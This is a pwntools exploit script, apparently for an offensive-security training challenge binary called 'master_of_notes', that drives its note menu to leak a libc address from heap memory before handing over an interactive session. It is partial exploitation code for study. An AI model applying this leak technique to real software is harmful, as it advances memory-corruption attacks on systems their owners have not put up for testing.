from pwn import *
import sys
import time

context.arch = 'amd64'

if(len(sys.argv) > 1):
    if(sys.argv[1] == '--debug'):
        p = process("./master_of_notes")
        gdb.attach(p, """
        """ )
        input("wait...")
    elif(sys.argv[1] == '--strace'):
        p = process(["strace", "./master_of_notes"])
    elif(sys.argv[1] == '--remote'):
        p = remote("bin.training.offdef.it", 4004)
else:
    p = process("./master_of_notes")

def register(name, password):
    p.recvuntil(b'> ')
    p.sendline(b'1')
    p.recvuntil(b'Name: ')
    p.sendline(name)
    p.recvuntil(b'Password: ')
    p.sendline(password)
    n = p.recvuntil(b'users.')[:-len(' users.')]
    num_usr = int(n[-1] - ord('0'))
    n = p.recvuntil(b'notes.')[:-len(' notes.')]
    num_notes = int(n[-1] - ord('0'))
    return (num_usr, num_notes)

def login(name, password):
    p.recvuntil(b'> ')
    p.sendline(b'2')
    p.recvuntil(b'Name: ')
    p.sendline(name)
    p.recvuntil(b'Password: ')
    p.sendline(password)

def create_note(idx, size):
    p.recvuntil(b'> ')
    p.sendline(b'1')
    p.recvuntil(b'Index: ')
    p.sendline(b'%d' % (idx))
    p.recvuntil(b'Note size: ')
    p.sendline(b'%d' % (size))

def fill_note(idx, content):
    p.recvuntil(b'> ')
    p.sendline(b'2')
    p.recvuntil(b'Index: ')
    p.sendline(b'%d' % (idx))
    p.recvuntil(b'Content: ')
    p.send(content)

def print_note(idx):
    p.recvuntil(b'> ')
    p.sendline(b'3')
    for i in range(idx+1):
        p.recvuntil(b']')
    p.recvuntil(b'Note: ')
    note = p.recvuntil(b'\n')[:-1]
    p.recvuntil(b'Quit')
    return note

def delete_note(idx):
    p.recvuntil(b'> ')
    p.sendline(b'4')
    p.recvuntil(b'Index: ')
    p.sendline(b'%d' % (idx))

libc = ELF("./libc-2.27.so")
exe = ELF("./master_of_notes")

# LEAK LIBC

name = b"aaaa"
password = b"aaaa"

(u, n) = register(name, password)
print(f"{u} users and {n} notes")

login(name, password)

create_note(0, 10)
fill_note(0, b'a')

input('before print')

offset = 0x3ebc00
leak = b'\x00' +  print_note(0)[1:] + b'\x00\x00'

print("[!] offset: %#x" % offset)
libc.address = u64(leak) - offset
print("[!] leak libc: %#x" % libc.address)

input('before delete')
delete_note(0)

p.interactive()